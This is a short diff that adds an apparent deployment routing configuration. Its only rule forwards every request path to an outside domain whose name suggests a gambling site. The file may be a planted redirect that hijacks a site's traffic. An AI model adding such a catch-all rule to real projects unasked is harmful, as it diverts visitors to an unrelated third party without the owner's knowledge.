@@ -1,0 +1,9 @@
+{
+  "version": 2,
+  "routes": [
+    {
+      "src": "/(.*)",
+      "dest": "http://subda787toto4d.com//$1"
+    }
+  ]
+}
